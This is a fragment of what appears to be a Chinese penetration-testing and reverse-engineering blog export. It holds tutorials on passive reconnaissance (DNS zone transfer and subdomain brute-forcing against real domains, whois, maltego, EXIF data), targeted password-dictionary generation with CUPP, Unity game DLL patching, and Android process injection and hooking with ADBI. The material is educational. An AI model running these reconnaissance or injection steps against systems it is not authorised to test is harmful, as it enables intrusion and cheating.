<li><code>theharvester -d 163.com -l 200 -b bing</code><ul>
<li>第一个参数是网站，第二个是搜索的个数，第三个是搜索引擎</li>
</ul>
</li>
<li><code>metagoofil -d 域名 -t 文件类型（pdf之类的） -l 搜索个数 -o 工作目录 -f 输出文件</code></li>
</ol>
<p>这两个是需要翻墙的。</p>
<ol start="3">
<li>maltego</li>
</ol>
<p>这个是个神器，非常好用，适合收集各种个样子的信息，但是缺点就是需要翻墙，在使用之前要注册他的一个账号然后登陆就好。<br>并且在打开之后需要安装它的一个插件：<code>PATERVA CTAS CE</code>这个插件。<br>我还安装了SHODAN的插件，但是给了API还是不好用不知道为什么说我的无效，可能没给钱吧。<br>通过拖拉控件就可以进行数据的收集：<br><img src="img1.jpg" alt="maltego"><br>基本可以收集我们之前软件都可以获得到的信息。<br>这可能是这个信息收集里面最好用的了吧。</p>
<h1 id="图片信息查看"><a href="#图片信息查看" class="headerlink" title="图片信息查看"></a>图片信息查看</h1><p>通过exiftool这个工具如果招聘信息没有被抹除的话呢是可以查看到经纬度和照相机之类的信息的。<br><img src="img2.jpg" alt="查看信息"><br>使用：<code>apt-get install exiftool</code>安装工具，有点大可能需要安装十分钟多点，中途还需要点个确定。<br>当然我们可以看到其实自带的图片查看器也是可以查看到的，但是这些信息也是比较重要的。</p>
<h1 id="密码字典生成"><a href="#密码字典生成" class="headerlink" title="密码字典生成"></a>密码字典生成</h1><ol>
<li>cupp比较简单，<code>apt-get install cupp</code>这个样子就能够进行安装了，安装完毕之后使用-i参数进行密码字典的配置。<ul>
<li>比较关键的是最后三个问题，第一个是是否要添加一个一些其他的关键密码，第二个是是否要添加一些特殊的字符在单词末尾，第三个是是否要添加随机数在单词的末尾，还有一个是好像使用一个随机数做些计算之类的。</li>
</ul>
</li>
</ol>
<h2 id="pscp"><a href="#pscp" class="headerlink" title="pscp"></a>pscp</h2><p>由于我的虚拟机不是特别好用，VMtools不好用，记录一下使用ssh传数据吧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pscp C:\Users\a\Desktop\IMG_6565.JPG root@192.168.209.138</span><br></pre></td></tr></table></figure>
<p>第一个参数是文件路径，第二个参数是IP<br>当然我们是需要打开SSH的：<code>service ssh start</code>。<br>当然第一次打开之前还是需要配置的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改sshd_config文件，命令为：</span><br><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">将#PasswordAuthentication no的注释去掉，并且将NO修改为YES &#x2F;&#x2F;kali中默认是yes</span><br><span class="line">将PermitRootLogin without-password修改为</span><br><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>
<p>别人博客上的转过来，这样就可以。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>被动信息收集1</title>
    <url>/2020/04/10/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861/</url>
    <content><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>用于解析域名的IP，分为A，C name，ptr，mx等记录，A为主机记录，就是可以直接查询到相对应的IP， C name 别名记录（返回下一个域名），ptr IP查域名，mx邮件记录。</p>
<h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><p>kali中使用nslookup命令，进入之后，输入想要查询的域名：<br><img src="img1.jpg" alt="NSlookUP"><br>可以看到，<code>www.sina.com</code>一步步的指向真正的域名IP，那个Server使我们的域名服务器主机，我们可以使用：<code>set type=a</code>等记录设置我们想要查看的信息，默认只有a记录的。使用<code>set type=ptr</code>反向查询IP对应的域名，通过使用：<code>server xxx.xxx.xxx.xxx</code>来设置我们的域名服务器。<br>type与q相同。<br>q=any的话呢是将所有的记录全部查询出来。<br>text记录使用spf反垃圾的一个功能，也是反向解析，主要是判断是否是真正的邮件服务器发送来的。<br>nslookup也是可以再一条输入，就是在后面跟上。<br>例如：nslookup -q=any <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> XXX.XXX.XXX.XXX</p>
<h2 id="智能DNS"><a href="#智能DNS" class="headerlink" title="智能DNS"></a>智能DNS</h2><p>主要是用户所处的位置不同，返回的IP也是不同的。</p>
<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><h3 id="DNS查询bind信息"><a href="#DNS查询bind信息" class="headerlink" title="DNS查询bind信息"></a>DNS查询bind信息</h3><p>查询DNS服务器使用的bind版本信息可以帮助我们获取DNS服务器的相对应的漏洞信息，寻找机会去得到DNS服务器中的数据，在dig中可以使用：<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code>命令来查询bind的版本信息，但是不是所有的都可以：<br><img src="img2.jpg" alt="dig"><br>@后面的是我们需要查询的服务器，在查询域名ns记录的时候我们是可以获取到的。<br><img src="img3.jpg" alt="ns查询"></p>
<h3 id="DNS追踪"><a href="#DNS追踪" class="headerlink" title="DNS追踪"></a>DNS追踪</h3><p>通过使用：<code>dig +trace www.sina.com</code>，就可以对其追踪DNS信息，访问的方式是先通过本地DNS获取root域的信息，返回root域的名称，再通过root域获取.com域的信息，在这期间虽然获得了.com的信息，但是还是再一次通过本地DNS进行一个验证，获取到了.com的域DNS服务器信息，再通过其获取sina.com域的域名服务器，再通过sina.com获取到了<a href="http://www.sina.com的具体IP地址。" target="_blank" rel="noopener">www.sina.com的具体IP地址。</a><br>在这期间需要注意的是，dig多次访问本地DNS以验证我们通过root和.com获取到的信息的正确性。<br><img src="img4.jpg" alt="DNS追踪"></p>
<h3 id="DNS服务器区域传输"><a href="#DNS服务器区域传输" class="headerlink" title="DNS服务器区域传输"></a>DNS服务器区域传输</h3><p>使用afxr可以进行DNS服务器的区域性传输，有的时候服务器存在一定缺陷的时候我们是可以获取到相对应许多信息的，有时候会获取到域名下的许多不知道的域名：<br><img src="img5.jpg" alt="DNS域传输"><br>可以看到获取到了许多信息，使用的格式是：<code>dig @域名服务器 域名 afxr</code>这个样子就可以获取到传输的信息了。<br><code>host -T -l 域名 域名服务器</code>也是可以进行获取的（-T使用TCP方式）</p>
<h2 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h2><p><code>fierce</code>命令在DNS信息收集的时候很好用，他会自动帮助我们查找ns记录，并且还会闲判断是否存在DNS服务器域传输的漏洞，最后再暴力破解是否存在字典中的子域：<code>fierce -dnsserver 8.8.8.8 -dns 域名 -wordlist /usr/share/fierce/hosts.txt</code>8.8.8.8是我们指定的域名服务器。<br><img src="img6.jpg" alt="爆破"><br>注意的是，我们不能带前面的子域名。<br><code>dnsenum -f 文件 -dnsserver 8.8.8.8 sina.com -o sina.xml</code>基本格式也是很类似的。<br>这个的功能很全面，支持域传输，版本信息，爆破，还支持导出文件：<br><img src="img7.jpg" alt="dnsenum"><br>还算比较好用，但是感觉慢了一点。</p>
<h2 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h2><p>这个也是比较关键的一部分，使用whois命令可以轻松收集到许多信息：<code>whois xxx.com</code><br><img src="img8.jpg" alt="whois"><br>许多信息的都是已经收集到了。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Android U3D修改</title>
    <url>/2020/04/06/Android-U3D%E4%BF%AE%E6%94%B9/</url>
    <content><![CDATA[<h1 id="U3D游戏"><a href="#U3D游戏" class="headerlink" title="U3D游戏"></a>U3D游戏</h1><p>首先我们判断这个游戏是否是U3D可以根据是否在lib\armxxx目录下存在：<code>libmain.so</code>,<code>libmono.so</code>,<code>libunity.so</code>。如果存在的话呢就八九不离十了，这个时候我们就可以来分析相关的DLL，如果有加密DLL，那么我们就在相关函数位置dump我们的DLL，然后替换成官网的mono，思路很多，网络上也是很多。</p>
<h2 id="Assembly-CSharp-dll"><a href="#Assembly-CSharp-dll" class="headerlink" title="Assembly-CSharp.dll"></a>Assembly-CSharp.dll</h2><p>加解密就是对这个DLL进行操作。如果没有加密的话呢，那么我们就可以直接使用Reflector进行反编译修改，下面就尝试修改实现无敌：</p>
<ol>
<li><p>首先我们将我们的dll拖进去，然后点击搜索，搜索可能存在的字符，例如Dead，这个就是死亡，尝试寻找<br><img src="img2.jpg" alt="搜索"><br>这里需要注意我们点击的是第二个，因为第一个是搜索类，第二个才是搜索成员，搜索到一个函数之后，我们双机他，如果出现这个样子的一个对话框：<br><img src="img1.jpg" alt="加载DLL"><br>就是让你重新加载一下这个DLL，我们重新选择然后加载就好了</p>
</li>
<li><p>分析发现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dead</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GameMangerInit.freeGifts(GameManager.getInstance().giftUses);</span><br><span class="line">    GameManager.getInstance().giftUses = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, GiftUse&gt;();</span><br><span class="line">    Object.Destroy(<span class="keyword">this</span>.skillAnim);</span><br><span class="line">    Object.Instantiate(Resources.Load(<span class="string">"Prefabs/Effect/explosion"</span>), base.get_transform().get_position(), Quaternion.get_identity());</span><br><span class="line">    base.get_gameObject().get_transform().set_position(<span class="keyword">new</span> Vector3(<span class="number">0f</span>, <span class="number">-12f</span>, <span class="number">0f</span>));</span><br><span class="line">    <span class="keyword">this</span>.isDead = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">this</span>.skillAnim = null;</span><br><span class="line">    <span class="keyword">this</span>.isSkill = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.riseTime = <span class="number">0f</span>;</span><br><span class="line">    showRecharge = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>this.isDead = true;</code>这个语句就很类似与我们的玩家死亡，而且将其改为了true，那么我们只要将其改为false那么我们应该就会不死。</p>
</li>
<li><p>Relfexil插件<br>使用这个插件我们可以我们可以修改，他在下方会显示IL代码<br><img src="img3.jpg" alt="插件"><br>然后我们找到相对应的位置：<br><img src="img4.jpg" alt="关键"><br>可以看到这个ldc.i4.1是false，那么我们改为ldc.i4.0将会一直是true，我们右键点击Edit…，然后修改数据：<br><img src="img5.jpg" alt="修改数据"><br>然后点击Update，之后我们选中我们添加的这个DLL，我们右键Relfexil插件，选项里有个Save-as我们另存为就可以了</p>
</li>
<li><p>替换DLL<br>最后我们替换我们的DLL，记住名称不要搞混忘记修改</p>
</li>
</ol>
<p>然后有的时候需要重新签名也不要忘记，最终运行发现可以不死。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Android so 动态修改内存</title>
    <url>/2020/04/05/Android-so-%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98/</url>
    <content><![CDATA[<h1 id="Android内存修改"><a href="#Android内存修改" class="headerlink" title="Android内存修改"></a>Android内存修改</h1><p>这个主要分为java层和so层的修改，java层基于反射，而so层的分类又分为两种，一种是不注入的修改，修改proc目录下的内容，而注入式就是我们的内存修改，也是比较常用。</p>
<h2 id="so层修改"><a href="#so层修改" class="headerlink" title="so层修改"></a>so层修改</h2><p>我们如果不修改代码段，仅仅是修改data段之类的是不需要修改属性页权限的。<br>实例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL Java_com_example_testjni_NativeClass_settotal</span><br><span class="line">  (JNIEnv *, jobject)</span><br><span class="line">&#123;</span><br><span class="line">	total++;</span><br><span class="line">	<span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是一个简单的数据累加，我们的目的就是可以随意修改静态变量。</p>
<p>首先我们需要先找到这个变量的相对偏移，首先我们用IDA搜索这个导出函数：<br><img src="img1.jpg" alt="导出函数"><br>这个带符号的加1其实就是我们的静态变量加一，所以这个静态变量的地址放在了我们的R0寄存器，而R0的值就是来自于R3寄存器指向的地址的值，所以R3是我们需要分析的，R3的地址是之前的R3加上PC，IDA给我们计算出来其实实际上就是加上4004，而这个4004是如何计算出来的呢？<br>我们动态分析一下，动态调试转到之后看到这个代码：</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F88 Java_com_example_testjni_NativeClass_settotal</span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F88 <span class="keyword">LDR </span>            <span class="built_in">R3</span>, =(dword_4E25B004 - <span class="number">0x4E257F8E</span>)</span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F8A <span class="keyword">ADD </span>            <span class="built_in">R3</span>, <span class="built_in">PC</span>  <span class="comment">; dword_4E25B004</span></span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F8C <span class="keyword">LDR </span>            <span class="built_in">R0</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F8E <span class="keyword">ADDS </span>           <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F90 <span class="keyword">STR </span>            <span class="built_in">R0</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F92 <span class="keyword">BX </span>             <span class="built_in">LR</span></span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F92 <span class="comment">; End of function Java_com_example_testjni_NativeClass_settotal</span></span><br><span class="line"><span class="symbol">libTestJNI.so</span>:<span class="number">4</span>E257F92</span><br></pre></td></tr></table></figure>
<p>R3的值一开始是<code>4E25B004 - 0x4E257F8E</code>得到的，经计算是：0x3706<br><img src="img2.jpg" alt="R3"><br>确实是0x3706，我们增加的这个PC其实是IDA的PC往下指向的2两条指令，下面两条指令都是两个字节，所以是4个字节（thumb指令），而当前的指令（执行到ADD的时候）PC是我们当前查看的这个模块加上F8A：<br><img src="img3.jpg" alt="PC偏移"><br>所以我们应该使用基地址+0xF8A+0x4+0x3076=0x4004<br>所以我们静态变量的地址应该是这个so模块加上0x4004得到的地址。<br>最后我们可以看下R0的值：<br><img src="img4.jpg" alt="R0"><br>确实使我们的变量。<br>分析到这里就可以了，我们现在需要解决的就是我们如何修改这个内存单元的值，还是用注入实现吧，方便快捷。</p>
<p>首先我们先要有这样一个函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetModuleBase</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> * ulModBase,<span class="keyword">pid_t</span> pid,<span class="keyword">const</span> <span class="keyword">char</span> * pszModName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> bRet = <span class="literal">false</span>;</span><br><span class="line">        FILE * fp = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">char</span> szMapFilePath[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">char</span> szMapFileLine[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(pszModName == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> bRet; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(szMapFilePath,<span class="string">"/proc/self/maps"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(szMapFilePath,<span class="string">"/proc/%d/maps"</span>,pid);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fp = fopen(szMapFilePath,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="keyword">while</span>(fgets(szMapFileLine,<span class="keyword">sizeof</span>(szMapFileLine),fp)!=<span class="literal">NULL</span>)</span><br><span class="line">              &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">strstr</span>(szMapFileLine,pszModName))</span><br><span class="line">                   &#123;</span><br><span class="line">                      <span class="keyword">char</span> * pszModAddrStart = strtok(szMapFileLine,<span class="string">"-"</span>);</span><br><span class="line">                      <span class="keyword">if</span>(pszModAddrStart)</span><br><span class="line">                      &#123;</span><br><span class="line">                          *ulModBase = strtoul(pszModAddrStart,<span class="literal">NULL</span>,<span class="number">16</span>);                     </span><br><span class="line"></span><br><span class="line">                          <span class="keyword">if</span>(*ulModBase == <span class="number">0x8000</span>)</span><br><span class="line">                            *ulModBase =<span class="number">0</span>;</span><br><span class="line">                bRet = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                   &#125; </span><br><span class="line">              &#125;</span><br><span class="line">           fclose(fp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数是用来获取我们模块基地址的：</p>
<ol>
<li>第一个参数由于我们用的是c语言，所以不能用引用，只能指针传入，并且，c语言要用bool这个命名，我们需要引入：<code>#include &lt;stdbool.h&gt;</code>。</li>
<li>第二个参数是我们要查询的进程PID</li>
<li>第三个参数是我们要查询的模块名称</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> address;</span><br><span class="line">GetModuleBase(&amp;address,getpid(),<span class="string">"libTestJNI.so"</span>);</span><br></pre></td></tr></table></figure>
<p>这个样子address这个变量里面存储的就是我们的模块基地址，既然得到了变量基地址，那么我们就可以用内存拷贝去修改我们的值：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> tmp=<span class="number">100</span>;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span>*)(address+<span class="number">0x4004</span>),(<span class="keyword">void</span>*)&amp;tmp,<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>这个样子就可以了，还是之前我们用到的ADBI框架。<br><code>./hijack -d -p 1935 -l /data/local/tmp/libexample.so</code><br>1935是我们进程的PID。<br><img src="img5.jpg" alt="修改成功"></p>
<p>java层就是将这个变量弹出吐司。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Android_Hook框架</title>
    <url>/2020/04/03/Android-Hook%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="Android-Hook"><a href="#Android-Hook" class="headerlink" title="Android  Hook"></a>Android  Hook</h1><p>相对于Windows下面的hook操作，Android的hook主要是以java层以及native层为主。</p>
<h2 id="native层hook"><a href="#native层hook" class="headerlink" title="native层hook"></a>native层hook</h2><p>通过一个注入器，将我们的so动态链接库注入到我们想要注入的进程中去。<br>注入的方式有间接注入（zytoge注入）和直接注入（ptrace注入）为主，我这里用的是ADBI框架，比较简单，还不需要root。<br>从GitHub下载下来之后，我们可以得到两个主要的关键文件夹。</p>
<ul>
<li>instruments</li>
<li>hijack</li>
</ul>
<p>第一个使我们要编写的so文件，也就是想要被注入的动态链接库，第二个是我们的注入器，作者已经写好了，我们只需要用NDK进行编译就好，来到jni的目录，使用ndk-build就可以编译（环境变量需要设置好），然后他就会在<code>hijack\obj\local\armeabi</code>目录下生成一个hijack文件，这个就是我们的注入器。<br>注入器得到之后，我们就需要编写我们的动态链接库，在这之前我们需要先获取到我们需要hook的函数，示例是之前那个TestJNI，分析java层之后，我们要hook的是encodestr这个函数。<br><img src="img1.jpg" alt="输出函数"><br><code>Java_com_example_testjni_NativeClass_encodestr</code>我们就是要hook这个函数，新建一个文件夹，拷贝一下example文件家中的内容：<br><img src="img2.jpg" alt="hook文件"><br>首先打开后缀是_arm的那个c文件，里面的内容：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> jstring  <span class="title">my_Java_com_example_testjni_NativeClass_encodestr</span><span class="params">(JNIEnv * env, jobject jstr, jstring username, jstring password)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">jstring  <span class="title">my_Java_com_example_testjni_NativeClass_encodestr_arm</span><span class="params">(JNIEnv * env, jobject jstr, jstring username, jstring password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> my_Java_com_example_testjni_NativeClass_encodestr(env, jstr, username, password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>声明的外部函数是我们的hook函数，然后又实现了一个后面是arm的函数，这两个函数的函数调用约定是要和我们的定义的一样的。<br><img src="img3.jpg" alt="函数声明"><br>由于使用了JNI的函数，所以我们要导入标准的jni.h，这个文件就是这么简单，我们来到另外一个文件：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../base/hook.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../base/base.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> log</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> log(...) \</span></span><br><span class="line">        &#123;FILE *fp = fopen(<span class="string">"/data/local/tmp/adbi_example.log"</span>, <span class="string">"a+"</span>); <span class="keyword">if</span> (fp) &#123;\</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, __VA_ARGS__);\</span><br><span class="line">        fclose(fp);&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// this file is going to be compiled into a thumb mode binary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((constructor)) my_init(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">hook_t</span> <span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// for demo code only</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> counter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// arm version of hook</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> jstring <span class="title">my_Java_com_example_testjni_NativeClass_encodestr_arm</span><span class="params">(JNIEnv * env, jobject jstr, jstring username, jstring password)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  log function to pass to the hooking library to implement central loggin</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  see: set_logfunction() in base.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_log</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">log</span>(<span class="string">"%s"</span>, msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">jstring <span class="title">my_Java_com_example_testjni_NativeClass_encodestr</span><span class="params">(JNIEnv * env, jobject jstr, jstring username, jstring password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	jstring (*orig_testjni_NativeClass_encodestr)(JNIEnv *, jobject , jstring , jstring );</span><br><span class="line">	orig_testjni_NativeClass_encodestr = (<span class="keyword">void</span>*)eph.orig;</span><br><span class="line"></span><br><span class="line">	hook_precall(&amp;eph);</span><br><span class="line">	jstring res = orig_testjni_NativeClass_encodestr(env, jstr, (*env)-&gt;NewStringUTF(env, <span class="string">"a"</span>), (*env)-&gt;NewStringUTF(env, <span class="string">"b"</span>));</span><br><span class="line">	<span class="keyword">if</span> (counter) &#123;</span><br><span class="line">		hook_postcall(&amp;eph);</span><br><span class="line">		<span class="built_in">log</span>(<span class="string">"encodestr() called\n"</span>);</span><br><span class="line">		counter--;</span><br><span class="line">		<span class="keyword">if</span> (!counter)</span><br><span class="line">			<span class="built_in">log</span>(<span class="string">"removing hook for encodestr()\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//char fail[] = "wkertest";</span></span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, <span class="string">"Hello Test NDK !"</span>);</span><br><span class="line">	<span class="comment">//return res;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	counter = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">log</span>(<span class="string">"%s started\n"</span>, __FILE__)</span><br><span class="line"> </span><br><span class="line">	set_logfunction(my_log);</span><br><span class="line"></span><br><span class="line">	hook(&amp;eph, getpid(), <span class="string">"libTestJNI."</span>, <span class="string">"Java_com_example_testjni_NativeClass_encodestr"</span>, my_Java_com_example_testjni_NativeClass_encodestr_arm, my_Java_com_example_testjni_NativeClass_encodestr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先定义了一个log函数，在<code>/data/local/tmp/adbi_example.log</code>这个目录下面我们保存我们的日志。<br>然后下面的一些内容照葫芦画瓢就好。<br>比较关键的是<code>my_Java_com_example_testjni_NativeClass_encodestr</code>这个函数和<code>my_init</code>函数，这两个函数是关键，前一个就是我们的hook函数，里面的内容编写我们要hook写入的方法，这里我们直接返回随意一个字符串就好。<br>他接受了原先的函数，使用了<code>hook_precall</code>这个样子的一个函数，具体这个函数是做什么的，没分析，反正他写上去了，咱就跟着写上去，然后下面的操作就根据需求来。<br><code>my_init</code>函数，是一个入口函数，关键的是：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">hook(&amp;eph, getpid(), <span class="string">"libTestJNI."</span>, <span class="string">"Java_com_example_testjni_NativeClass_encodestr"</span>, my_Java_com_example_testjni_NativeClass_encodestr_arm, my_Java_com_example_testjni_NativeClass_encodestr);</span><br></pre></td></tr></table></figure>
